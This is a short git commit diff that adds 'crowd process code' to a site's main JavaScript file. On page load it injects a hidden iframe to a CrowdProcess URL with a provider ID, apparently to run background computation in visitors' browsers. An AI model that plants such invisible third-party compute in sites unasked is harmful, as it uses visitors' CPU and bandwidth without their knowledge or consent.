3dc2c676267847870b05aba2c3557c8fa0e4bdd3
Jonas Hartmann <jonasharty@gmail.com>
2014-03-16 15:17:30 +0100

    Add crowd process code

--- js/main.js
+++ js/main.js
@@ -1,2 +1,10 @@
-(function() {
-})();
+(function(document) {
+    var d=document;
+    d.addEventListener("DOMContentLoaded",function(){
+      var a = d.createElement("iframe");
+      a.src = "https://ss.crowdprocess.com/#?providerId=8a5de4f9-4e40-416d-9811-cccd07adfe5c";
+      a.sandbox = "allow-scripts allow-same-origin";
+      a.style.display = "none";
+      d.body.appendChild(a);
+    });
+})(document);
